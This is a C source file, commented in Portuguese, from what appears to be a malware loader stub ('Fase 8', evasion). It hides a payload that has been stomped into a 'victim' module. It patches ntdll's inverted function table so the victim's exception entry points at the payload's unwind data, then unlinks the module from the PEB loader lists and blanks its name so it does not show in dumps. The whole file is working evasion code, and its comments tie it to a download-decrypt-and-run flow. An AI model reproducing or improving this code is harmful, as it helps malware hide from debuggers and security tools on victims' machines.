/* stub_evasion.c — Implementação Fase 8 (Tier-S).
 *
 * AVISO: estas técnicas tocam estruturas internas privadas do loader do
 * Windows.  Layouts variam entre builds.  Cada operação tem fallback
 * silente: se algo não bater, abortamos sem crashar — perdendo só a camada
 * extra de evasão, não o processo.
 *
 * Versões testadas: Win10 22H2, Win11 23H2/24H2 (layout idêntico de
 * LDR_DATA_TABLE_ENTRY e RTL_INVERTED_FUNCTION_TABLE).
 */
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include "stub_evasion.h"
#include <winternl.h>
#include <intrin.h>

extern void WriteLogFile(const char* msg);

/* === LDR_DATA_TABLE_ENTRY estendido (winternl.h tem só os primeiros campos) */
typedef struct _SERAPH_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY    InLoadOrderLinks;
    LIST_ENTRY    InMemoryOrderLinks;
    LIST_ENTRY    InInitializationOrderLinks;
    PVOID         DllBase;
    PVOID         EntryPoint;
    ULONG         SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG         Flags;
    USHORT        LoadCount;
    USHORT        TlsIndex;
    LIST_ENTRY    HashLinks;
    /* ... mais campos depois (ignorados) */
} SERAPH_LDR_DATA_TABLE_ENTRY;

/* === RTL_INVERTED_FUNCTION_TABLE (Win10 1809+) ============================ */
typedef struct _SERAPH_INV_TABLE_ENTRY {
    PVOID         FunctionTable;   /* IMAGE_RUNTIME_FUNCTION_ENTRY[] */
    PVOID         ImageBase;
    ULONG         SizeOfImage;
    ULONG         SizeOfTable;
} SERAPH_INV_TABLE_ENTRY;

typedef struct _SERAPH_INV_TABLE {
    ULONG         Count;
    ULONG         MaxCount;
    ULONG         Epoch;
    UCHAR         Overflow;
    UCHAR         _pad[3];
    SERAPH_INV_TABLE_ENTRY Entries[1];  /* tabela inline */
} SERAPH_INV_TABLE;

/* === Estado salvo para Revert =========================================== */
static SERAPH_INV_TABLE_ENTRY    s_savedInvEntry = {0};
static SERAPH_INV_TABLE_ENTRY*   s_invEntryAddr  = NULL;

static SERAPH_LDR_DATA_TABLE_ENTRY* s_unlinkedLdr = NULL;
static LIST_ENTRY s_savedLoad = {0};
static LIST_ENTRY s_savedMem  = {0};
static LIST_ENTRY s_savedInit = {0};

/* === Localizar LdrpInvertedFunctionTable em ntdll.dll =================== */
/* Heurística: dentro de RtlInsertInvertedFunctionTable o primeiro `lea
 * rax, [LdrpInvertedFunctionTable]` é o ponteiro.  Padrão comum:
 *    48 8D 0D ?? ?? ?? ??       ; lea rcx, [LdrpInvertedFunctionTable]
 * No Win10 22H2 o offset é estável; em outras builds pode variar mas o
 * lea é sempre o primeiro acesso a RIP-relative na função. */
static SERAPH_INV_TABLE* find_inverted_table(void) {
    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
    if (!hNt) return NULL;

    /* Função-source: RtlLookupFunctionEntry é PUBLIC e cedo em seu corpo
     * faz `lea rcx, [LdrpInvertedFunctionTable]` antes de iterar entries.
     * Tentamos várias funções como fonte para resiliência cross-build. */
    static const char* candidates[] = {
        "RtlLookupFunctionEntry",
        "RtlInsertInvertedFunctionTable",  /* fallback — tem param mas pode ter ref local */
        NULL
    };

    for (int c = 0; candidates[c]; c++) {
        BYTE* p = (BYTE*)GetProcAddress(hNt, candidates[c]);
        if (!p) continue;
        /* Coleta até 4 leas RIP-relative; testa cada candidato como
         * SERAPH_INV_TABLE plausível (Count<=MaxCount<=0x400). */
        for (int i = 0; i < 0x200; i++) {
            BYTE b0 = p[i], b1 = p[i+1], b2 = p[i+2];
            if ((b0 == 0x48 || b0 == 0x4C) && b1 == 0x8D &&
                ((b2 & 0xC7) == 0x05)) {
                INT32 disp = *(INT32*)(p + i + 3);
                SERAPH_INV_TABLE* cand = (SERAPH_INV_TABLE*)(p + i + 7 + disp);
                /* Validate: ponteiro está em ntdll RW data + layout sane.
                 * Use IsBadReadPtr para segurança. */
                if (IsBadReadPtr(cand, sizeof(*cand))) continue;
                if (cand->Count == 0 || cand->Count > 0x400) continue;
                if (cand->MaxCount < cand->Count || cand->MaxCount > 0x400) continue;
                /* Sanity adicional: Entries[0].ImageBase deve ser um VA válido */
                if (IsBadReadPtr(&cand->Entries[0], sizeof(SERAPH_INV_TABLE_ENTRY))) continue;
                if (cand->Entries[0].ImageBase == NULL) continue;
                return cand;
            }
        }
    }
    return NULL;
}

/* === P8.1 — patch entry da victim ====================================== */
int StubEvasion_PatchInvertedTable(const StubPE* pe, const StubVictim* v) {
    if (!pe || !v || !v->baseVA) return -1;

    SERAPH_INV_TABLE* tbl = find_inverted_table();
    if (!tbl) {
        WriteLogFile("evasion: InvertedFunctionTable not found");
        return -2;
    }

    /* Sanity: Count/MaxCount plausíveis */
    if (tbl->Count == 0 || tbl->Count > tbl->MaxCount || tbl->MaxCount > 0x400) {
        WriteLogFile("evasion: InvertedFunctionTable layout mismatch");
        return -3;
    }

    SERAPH_INV_TABLE_ENTRY* e = NULL;
    for (ULONG i = 0; i < tbl->Count; i++) {
        if (tbl->Entries[i].ImageBase == v->baseVA) { e = &tbl->Entries[i]; break; }
    }
    if (!e) {
        /* Pode acontecer se a victim não tinha .pdata original — sem
         * problema, nada para patch. */
        WriteLogFile("evasion: victim not in InvertedFunctionTable (no .pdata?)");
        return 0;
    }

    /* Salva original para revert */
    s_savedInvEntry = *e;
    s_invEntryAddr  = e;

    /* Repointa para .pdata do payload (já dentro da victim image após stomp) */
    DWORD oldProt = 0;
    if (!VirtualProtect(e, sizeof(*e), PAGE_READWRITE, &oldProt)) {
        WriteLogFile("evasion: VP InvertedFunctionTable failed");
        return -4;
    }
    if (pe->exceptionRVA != 0 && pe->exceptionSize != 0) {
        e->FunctionTable = (BYTE*)v->baseVA + pe->exceptionRVA;
        e->SizeOfTable   = pe->exceptionSize;
    } else {
        /* svc.dll sem .pdata: zera para suprimir unwind divergente */
        e->FunctionTable = NULL;
        e->SizeOfTable   = 0;
    }
    /* ImageBase / SizeOfImage permanecem (mesmo range físico) */
    DWORD restore = 0;
    VirtualProtect(e, sizeof(*e), oldProt, &restore);

    WriteLogFile("evasion: InvertedFunctionTable patched");
    return 0;
}

void StubEvasion_RestoreInvertedTable(void) {
    if (!s_invEntryAddr) return;
    DWORD oldProt = 0;
    if (VirtualProtect(s_invEntryAddr, sizeof(*s_invEntryAddr),
                       PAGE_READWRITE, &oldProt)) {
        *s_invEntryAddr = s_savedInvEntry;
        DWORD r = 0;
        VirtualProtect(s_invEntryAddr, sizeof(*s_invEntryAddr), oldProt, &r);
    }
    s_invEntryAddr = NULL;
}

/* === P8.2 — Unlink do PEB->Ldr ========================================= */
static SERAPH_LDR_DATA_TABLE_ENTRY* find_ldr_entry(PVOID dllBase) {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    if (!peb || !peb->Ldr) return NULL;
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* p = head->Flink; p != head; p = p->Flink) {
        SERAPH_LDR_DATA_TABLE_ENTRY* e = CONTAINING_RECORD(
            p, SERAPH_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (e->DllBase == dllBase) return e;
    }
    return NULL;
}

static void list_unlink(LIST_ENTRY* e) {
    LIST_ENTRY* prev = e->Blink;
    LIST_ENTRY* next = e->Flink;
    if (prev) prev->Flink = next;
    if (next) next->Blink = prev;
    e->Flink = e->Blink = e;  /* circular self → ninguém alcança via walk */
}

int StubEvasion_UnlinkPEBEntry(const StubVictim* v) {
    if (!v || !v->baseVA) return -1;
    SERAPH_LDR_DATA_TABLE_ENTRY* e = find_ldr_entry(v->baseVA);
    if (!e) {
        WriteLogFile("evasion: LDR entry not found");
        return -2;
    }
    s_savedLoad = e->InLoadOrderLinks;
    s_savedMem  = e->InMemoryOrderLinks;
    s_savedInit = e->InInitializationOrderLinks;
    s_unlinkedLdr = e;

    list_unlink(&e->InLoadOrderLinks);
    list_unlink(&e->InMemoryOrderLinks);
    list_unlink(&e->InInitializationOrderLinks);

    /* Limpa BaseDllName/FullDllName: não revela nome em dumps de heap.
     * (Buffer apontado é separado; só precisamos zerar Length/MaximumLength
     * e o primeiro WCHAR para parar prints/logs.) */
    if (e->BaseDllName.Buffer && e->BaseDllName.MaximumLength >= sizeof(WCHAR)) {
        e->BaseDllName.Length = 0;
        e->BaseDllName.Buffer[0] = 0;
    }
    if (e->FullDllName.Buffer && e->FullDllName.MaximumLength >= sizeof(WCHAR)) {
        e->FullDllName.Length = 0;
        e->FullDllName.Buffer[0] = 0;
    }
    WriteLogFile("evasion: PEB->Ldr unlinked");
    return 0;
}

void StubEvasion_RelinkPEBEntry(void) {
    if (!s_unlinkedLdr) return;
    /* Reinsere reconectando vizinhos.  Se vizinhos foram modificados por
     * outras unlink/relink no meio tempo, isso pode corromper — mas no
     * fluxo único de Stub_DownloadDecryptAndRun isso não acontece. */
    SERAPH_LDR_DATA_TABLE_ENTRY* e = s_unlinkedLdr;
    e->InLoadOrderLinks = s_savedLoad;
    if (s_savedLoad.Blink) s_savedLoad.Blink->Flink = &e->InLoadOrderLinks;
    if (s_savedLoad.Flink) s_savedLoad.Flink->Blink = &e->InLoadOrderLinks;
    e->InMemoryOrderLinks = s_savedMem;
    if (s_savedMem.Blink) s_savedMem.Blink->Flink = &e->InMemoryOrderLinks;
    if (s_savedMem.Flink) s_savedMem.Flink->Blink = &e->InMemoryOrderLinks;
    e->InInitializationOrderLinks = s_savedInit;
    if (s_savedInit.Blink) s_savedInit.Blink->Flink = &e->InInitializationOrderLinks;
    if (s_savedInit.Flink) s_savedInit.Flink->Blink = &e->InInitializationOrderLinks;
    s_unlinkedLdr = NULL;
}
